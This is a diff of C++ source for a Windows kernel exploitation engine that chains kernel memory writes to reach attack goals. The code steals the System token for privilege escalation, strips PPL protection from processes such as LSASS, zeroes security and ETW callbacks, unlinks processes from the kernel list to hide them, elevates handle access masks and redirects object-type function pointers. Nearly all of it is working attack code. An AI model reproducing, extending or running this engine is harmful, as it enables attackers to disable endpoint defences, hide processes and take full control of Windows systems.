@@ -1,9 +1,7 @@
-#pragma once
-#include "GadgetDiscovery.h"
+#include "GadgetChaining.h"
 #include "SymbolResolver.hpp"
-#include <vector>
-#include <map>
-#include <string>
+#include <algorithm>
+#include <cctype>
 #include <sstream>
 #include <iostream>
 #include <Windows.h>
@@ -11,7 +9,7 @@
 
 #pragma comment(lib, "Psapi.lib")
 
-// Local helper for readable gadget type names (avoids dependency on main.cpp helper)
+// Local helper for readable gadget type names
 static std::string GadgetTypeName(GadgetType type) {
     switch (type) {
     case GadgetType::TOKEN_FIELD: return "TOKEN_FIELD";
@@ -38,114 +36,6 @@ static std::string GadgetTypeName(GadgetType type) {
     }
 }
 
-// Exploit goal types
-enum class ExploitGoal {
-    PRIVILEGE_ESCALATION,
-    BYPASS_PPL,
-    DISABLE_SECURITY,
-    ARBITRARY_READ,
-    ARBITRARY_WRITE,
-    CODE_EXECUTION_REDIRECT,
-    PERSISTENCE,
-    TOKEN_STEALING,
-    CALLBACK_DISABLE,
-    UNLINK_PROCESS
-};
-
-// Gadget chain structure
-struct GadgetChain {
-    ExploitGoal goal;
-    std::string goal_name;
-    std::string description;
-    std::vector<uint64_t> gadget_addresses;
-    std::map<uint64_t, uint64_t> new_values;
-    std::map<uint64_t, uint64_t> original_values;
-    std::vector<std::pair<uint64_t, uint64_t>> dependencies;
-    bool requires_trigger;
-    uint64_t trigger_address;
-    std::string trigger_type;
-    int success_probability;
-    std::vector<std::string> steps;
-    
-    bool IsValid() const { return !gadget_addresses.empty(); }
-    size_t Size() const { return gadget_addresses.size(); }
-};
-
-// Gadget chaining engine
-class GadgetChainingEngine {
-private:
-    KernelReadWrite* rw;
-    std::map<uint64_t, DataGadget> available_gadgets;
-    OffsetDatabase offsets;
-    
-    // Dependency graph
-    struct GadgetNode {
-        uint64_t address;
-        std::vector<uint64_t> depends_on;
-        std::vector<uint64_t> triggers;
-        bool executed;
-        uint64_t result;
-    };
-    
-    std::map<uint64_t, GadgetNode> graph;
-    
-public:
-    GadgetChainingEngine(KernelReadWrite* readWrite);
-    
-    // Set available gadgets
-    void SetAvailableGadgets(const std::map<uint64_t, DataGadget>& gadgets);
-    
-    // Find chains for various goals
-    GadgetChain FindPrivilegeEscalationChain(uint32_t targetPid = 0);
-    GadgetChain FindPPLBypassChain(uint32_t targetPid = 0, uint8_t newProt = 0);
-    GadgetChain FindDisableSecurityChain();
-    GadgetChain FindArbitraryReadChain();
-    GadgetChain FindArbitraryWriteChain();
-    GadgetChain FindCodeRedirectChain();
-    GadgetChain FindTokenStealingChain(uint32_t targetPid = 0);
-    GadgetChain FindCallbackDisableChain();
-    GadgetChain FindUnlinkProcessChain(uint32_t targetPid = 0);
-    
-    // Find chain by goal
-    GadgetChain FindChainForGoal(ExploitGoal goal);
-    
-    // Execute chain
-    bool ExecuteChain(const GadgetChain& chain);
-    bool RestoreChain(const GadgetChain& chain);
-    
-    // Analyze chains
-    std::vector<GadgetChain> FindAllPossibleChains();
-    GadgetChain FindOptimalChain(ExploitGoal goal);
-
-    // Verification
-    bool VerifyTokenMatchesSystem(uint32_t pid, uint64_t& targetTok, uint64_t& systemTok);
-    
-    // Chain information
-    std::string ChainToString(const GadgetChain& chain) const;
-    void PrintChain(const GadgetChain& chain) const;
-    
-private:
-    void BuildDependencyGraph();
-    std::vector<uint64_t> TopologicalSort(const std::vector<uint64_t>& gadgets);
-    
-    // Chain building helpers
-    GadgetChain BuildTokenStealChain(uint32_t targetPid = 0);
-    GadgetChain BuildCallbackRedirectChain();
-    GadgetChain BuildHandleElevationChain();
-    
-    // Helper methods
-    std::vector<uint64_t> FindGadgetsByType(GadgetType type) const;
-    std::vector<uint64_t> FindGadgetsByPattern(const std::string& pattern) const;
-    uint64_t FindCurrentProcessToken() const;
-    uint64_t FindSystemProcessToken() const;
-    uint64_t FindSymbolAddress(const std::string& name) const;
-    bool IsPPLProcess(uint64_t process) const;
-    bool IsSecurityCallback(uint64_t callback) const;
-
-};
-
-// ================= Implementation =================
-
 GadgetChainingEngine::GadgetChainingEngine(KernelReadWrite* readWrite)
     : rw(readWrite) {
     OffsetManager mgr;
@@ -158,7 +48,6 @@ void GadgetChainingEngine::SetAvailableGadgets(const std::map<uint64_t, DataGadg
 }
 
 GadgetChain GadgetChainingEngine::FindPrivilegeEscalationChain(uint32_t targetPid) {
-    // Priv-esc reuses token steal chain
     auto chain = BuildTokenStealChain(targetPid);
     chain.goal = ExploitGoal::PRIVILEGE_ESCALATION;
     chain.goal_name = "privilege escalation";
@@ -172,7 +61,6 @@ GadgetChain GadgetChainingEngine::FindPPLBypassChain(uint32_t targetPid, uint8_t
     chain.goal = ExploitGoal::BYPASS_PPL;
     chain.goal_name = "ppl bypass";
 
-    // Prefer LSASS if we have a writable Protection byte for it; otherwise fall back to self
     if (targetPid == 0) {
         for (auto& kv : available_gadgets) {
             const auto& g = kv.second;
@@ -195,7 +83,7 @@ GadgetChain GadgetChainingEngine::FindPPLBypassChain(uint32_t targetPid, uint8_t
             g.process_id == targetPid && g.is_writable) {
             chain.gadget_addresses = {g.address};
             chain.original_values[g.address] = g.original_value;
-            chain.new_values[g.address] = newProt; // set Protection byte to requested level
+            chain.new_values[g.address] = newProt;
             std::stringstream ss;
             ss << "Set _EPROCESS.Protection for process [" << targetPid;
             if (!g.owner_process.empty()) ss << " " << g.owner_process;
@@ -211,7 +99,6 @@ GadgetChain GadgetChainingEngine::FindPPLBypassChain(uint32_t targetPid, uint8_t
 }
 
 GadgetChain GadgetChainingEngine::FindDisableSecurityChain() {
-    // Default: all callbacks (used when no interactive selection)
     auto chain = BuildCallbackRedirectChain();
     chain.goal = ExploitGoal::DISABLE_SECURITY;
     chain.goal_name = "disable security";
@@ -219,40 +106,61 @@ GadgetChain GadgetChainingEngine::FindDisableSecurityChain() {
     return chain;
 }
 
-GadgetChain GadgetChainingEngine::FindArbitraryReadChain() {
-    auto chain = BuildHandleElevationChain(); // use handle access for read/write primitive
+GadgetChain GadgetChainingEngine::FindArbitraryReadChain(uint64_t targetAddr, size_t size) {
+    GadgetChain chain{};
+    chain.goal = ExploitGoal::ARBITRARY_READ;
+    chain.goal_name = "arbitrary read";
+
+    if (targetAddr && size) {
+        chain.gadget_addresses = {targetAddr};
+        chain.dependencies.push_back({targetAddr, size});
+        std::stringstream ss;
+        ss << "Read " << size << " bytes from 0x" << std::hex << targetAddr << std::dec;
+        chain.description = ss.str();
+        return chain;
+    }
+
+    chain = BuildHandleElevationChain();
     if (chain.IsValid()) {
         chain.goal = ExploitGoal::ARBITRARY_READ;
         chain.goal_name = "arbitrary read";
         chain.description = "Handle table access-based read primitive";
         return chain;
     }
-    chain.goal = ExploitGoal::ARBITRARY_READ;
-    chain.goal_name = "arbitrary read";
     chain.description = "No viable read primitive found";
     return chain;
 }
 
-GadgetChain GadgetChainingEngine::FindArbitraryWriteChain() {
-    auto chain = BuildHandleElevationChain();
+GadgetChain GadgetChainingEngine::FindArbitraryWriteChain(uint64_t targetAddr, uint64_t value) {
+    GadgetChain chain{};
+    chain.goal = ExploitGoal::ARBITRARY_WRITE;
+    chain.goal_name = "arbitrary write";
+
+    if (targetAddr) {
+        chain.gadget_addresses = {targetAddr};
+        chain.new_values[targetAddr] = value;
+        std::stringstream ss;
+        ss << "Write 0x" << std::hex << value << " to 0x" << targetAddr << std::dec;
+        chain.description = ss.str();
+        return chain;
+    }
+
+    chain = BuildHandleElevationChain();
     if (chain.IsValid()) {
         chain.goal = ExploitGoal::ARBITRARY_WRITE;
         chain.goal_name = "arbitrary write";
         chain.description = "Handle table access-based write primitive";
         return chain;
     }
-    chain.goal = ExploitGoal::ARBITRARY_WRITE;
-    chain.goal_name = "arbitrary write";
     chain.description = "No viable write primitive found";
     return chain;
 }
 
-GadgetChain GadgetChainingEngine::FindCodeRedirectChain() {
+GadgetChain GadgetChainingEngine::FindCodeRedirectChain(uint64_t targetOverride) {
     GadgetChain chain{};
     chain.goal = ExploitGoal::CODE_EXECUTION_REDIRECT;
     chain.goal_name = "code redirection";
 
-    // Use object type function pointers as redirection targets
     const GadgetType targets[] = {
         GadgetType::OBJECT_TYPE_OPEN,
         GadgetType::OBJECT_TYPE_CLOSE,
@@ -262,10 +170,11 @@ GadgetChain GadgetChainingEngine::FindCodeRedirectChain() {
         GadgetType::OBJECT_TYPE_QUERYNAME
     };
 
-    // Optional target address from env var DOG_REDIRECT_TARGET (hex)
-    uint64_t target = 0;
-    if (const char* env = std::getenv("DOG_REDIRECT_TARGET")) {
-        target = _strtoui64(env, nullptr, 0);
+    uint64_t target = targetOverride;
+    if (!target) {
+        if (const char* env = std::getenv("DOG_REDIRECT_TARGET")) {
+            target = _strtoui64(env, nullptr, 0);
+        }
     }
 
     for (auto t : targets) {
@@ -276,9 +185,11 @@ GadgetChain GadgetChainingEngine::FindCodeRedirectChain() {
                 chain.original_values[g.address] = g.original_value;
                 if (target) {
                     chain.new_values[g.address] = target;
-                    chain.description = "Redirect object type procedure to 0x" + std::to_string(target);
+                    std::stringstream ss;
+                    ss << "Redirect object type procedure to 0x" << std::hex << target;
+                    chain.description = ss.str();
                 } else {
-                    chain.description = "Set DOG_REDIRECT_TARGET=0x<addr> to write new target";
+                    chain.description = "Set DOG_REDIRECT_TARGET=0x<addr> or pass target to write new value";
                 }
                 return chain;
             }
@@ -300,7 +211,6 @@ GadgetChain GadgetChainingEngine::FindUnlinkProcessChain(uint32_t targetPid) {
     chain.goal = ExploitGoal::UNLINK_PROCESS;
     chain.goal_name = "unlink process";
 
-    // If no PID specified, pick the first process we have a token gadget for
     if (targetPid == 0) {
         for (auto& kv : available_gadgets) {
             auto& g = kv.second;
@@ -310,10 +220,8 @@ GadgetChain GadgetChainingEngine::FindUnlinkProcessChain(uint32_t targetPid) {
             }
         }
     }
-
     if (targetPid == 0) return chain;
 
-    // Find _EPROCESS for target via token gadget
     uint64_t eproc = 0;
     for (auto& kv : available_gadgets) {
         auto& g = kv.second;
@@ -329,7 +237,6 @@ GadgetChain GadgetChainingEngine::FindUnlinkProcessChain(uint32_t targetPid) {
     uint64_t blink = rw->ReadPointer(links + 8);
     if (!flink || !blink) return chain;
 
-    // Prepare unlink: blink->Flink = flink; flink->Blink = blink; self->Flink/Blink = self
     chain.gadget_addresses = {blink, flink, links};
     chain.original_values[blink] = rw->ReadPointer(blink);
     chain.original_values[flink + 8] = rw->ReadPointer(flink + 8);
@@ -338,7 +245,7 @@ GadgetChain GadgetChainingEngine::FindUnlinkProcessChain(uint32_t targetPid) {
 
     chain.new_values[blink] = flink;
     chain.new_values[flink + 8] = blink;
-    chain.new_values[links] = links;         // self-point to avoid dangling
+    chain.new_values[links] = links;
     chain.new_values[links + 8] = links;
 
     std::stringstream ss;
@@ -356,7 +263,7 @@ GadgetChain GadgetChainingEngine::FindChainForGoal(ExploitGoal goal) {
     case ExploitGoal::ARBITRARY_WRITE: return FindArbitraryWriteChain();
     case ExploitGoal::CODE_EXECUTION_REDIRECT: return FindCodeRedirectChain();
     case ExploitGoal::PERSISTENCE: return GadgetChain{};
-    case ExploitGoal::UNLINK_PROCESS: return FindUnlinkProcessChain();
+    case ExploitGoal::UNLINK_PROCESS: return FindUnlinkProcessChain(0);
     case ExploitGoal::TOKEN_STEALING: return FindTokenStealingChain(0);
     case ExploitGoal::CALLBACK_DISABLE: return GadgetChain{};
     default: return GadgetChain{};
@@ -364,7 +271,6 @@ GadgetChain GadgetChainingEngine::FindChainForGoal(ExploitGoal goal) {
 }
 
 bool GadgetChainingEngine::ExecuteChain(const GadgetChain& chain) {
-    // Placeholder execution: write requested new_values if any
     bool ok = true;
     for (auto& kv : chain.new_values) {
         ok &= rw->Write<uint64_t>(kv.first, kv.second);
@@ -400,7 +306,6 @@ bool GadgetChainingEngine::VerifyTokenMatchesSystem(uint32_t pid, uint64_t& targ
     targetTok = 0;
     systemTok = 0;
 
-    // locate target token field
     uint64_t targetField = 0;
     for (auto& kv : available_gadgets) {
         auto& g = kv.second;
@@ -412,7 +317,6 @@ bool GadgetChainingEngine::VerifyTokenMatchesSystem(uint32_t pid, uint64_t& targ
     if (!targetField) return false;
     targetTok = rw->ReadPointer(targetField) & ~0xFULL;
 
-    // get system token
     {
         LPVOID drivers[1024] = {};
         DWORD needed = 0;
@@ -494,7 +398,6 @@ void GadgetChainingEngine::BuildDependencyGraph() {
 }
 
 std::vector<uint64_t> GadgetChainingEngine::TopologicalSort(const std::vector<uint64_t>& gadgets) {
-    // Placeholder: already ordered
     return gadgets;
 }
 
@@ -519,7 +422,6 @@ GadgetChain GadgetChainingEngine::BuildTokenStealChain(uint32_t targetPid) {
     uint64_t sysTokenRaw = 0, selfTokenRaw = 0;
     uint32_t sysPid = 0, selfFoundPid = 0;
 
-    // Try to get System (pid 4) token directly first
     {
         LPVOID drivers[1024] = {};
         DWORD needed = 0;
@@ -532,7 +434,7 @@ GadgetChain GadgetChainingEngine::BuildTokenStealChain(uint32_t targetPid) {
             uint64_t eproc = rw->ReadPointer(nt_base + *rva_psinit);
             if (eproc) {
                 uint64_t tok = rw->ReadPointer(eproc + offsets.eprocess_token);
-                tok &= ~0xFULL; // strip _EX_FAST_REF low bits
+                tok &= ~0xFULL;
                 if (tok) {
                     sysTokenVal = tok;
                     sysPid = 4;
@@ -554,7 +456,7 @@ GadgetChain GadgetChainingEngine::BuildTokenStealChain(uint32_t targetPid) {
         } else if (sysPid != 4 && !sysTokenAddr && isSystemOwner) {
             sysTokenAddr = g.address;
             sysTokenVal = g.original_value;
-            sysTokenRaw = rw->ReadPointer(g.address); // keep raw ref bits
+            sysTokenRaw = rw->ReadPointer(g.address);
             sysPid = (uint32_t)g.process_id;
         } else if (g.process_id == selfPid) {
             selfTokenAddr = g.address;
@@ -565,7 +467,6 @@ GadgetChain GadgetChainingEngine::BuildTokenStealChain(uint32_t targetPid) {
     }
 
     if ((sysTokenAddr || sysTokenVal) && selfTokenAddr) {
-        // Use System token value (already fast-ref masked in discovery); fall back to raw
         uint64_t newTokenVal = sysTokenVal ? sysTokenVal : (sysTokenRaw & ~0xFULL);
 
         chain.gadget_addresses = {selfTokenAddr};
@@ -578,7 +479,32 @@ GadgetChain GadgetChainingEngine::BuildTokenStealChain(uint32_t targetPid) {
     return chain;
 }
 
-GadgetChain GadgetChainingEngine::BuildCallbackRedirectChain() { return GadgetChain{}; }
+GadgetChain GadgetChainingEngine::BuildCallbackRedirectChain() {
+    GadgetChain chain{};
+    for (auto& kv : available_gadgets) {
+        const auto& g = kv.second;
+        if (!g.is_writable) continue;
+        switch (g.type) {
+        case GadgetType::PROCESS_CALLBACK:
+        case GadgetType::THREAD_CALLBACK:
+        case GadgetType::IMAGE_CALLBACK:
+        case GadgetType::MINIFILTER_CALLBACK:
+        case GadgetType::ETW_CALLBACK:
+        case GadgetType::BUGCHECK_CALLBACK:
+        case GadgetType::SHUTDOWN_CALLBACK:
+            chain.gadget_addresses.push_back(g.address);
+            chain.original_values[g.address] = g.original_value;
+            chain.new_values[g.address] = 0;
+            break;
+        default:
+            break;
+        }
+    }
+    if (!chain.gadget_addresses.empty()) {
+        chain.description = "Disable " + std::to_string(chain.gadget_addresses.size()) + " security callbacks";
+    }
+    return chain;
+}
 
 GadgetChain GadgetChainingEngine::BuildHandleElevationChain() {
     GadgetChain chain{};
@@ -590,14 +516,13 @@ GadgetChain GadgetChainingEngine::BuildHandleElevationChain() {
         if (g.type == GadgetType::HANDLE_TABLE_ENTRY_ACCESS && g.is_writable) {
             chain.gadget_addresses.push_back(g.address);
             chain.original_values[g.address] = g.original_value;
-            chain.new_values[g.address] = 0xFFFFFFFF; // full access
+            chain.new_values[g.address] = 0xFFFFFFFF;
             chain.description = "Elevate handle access mask to full control";
             return chain;
         }
     }
     return chain;
 }
-
 
 std::vector<uint64_t> GadgetChainingEngine::FindGadgetsByType(GadgetType type) const {
     std::vector<uint64_t> result;
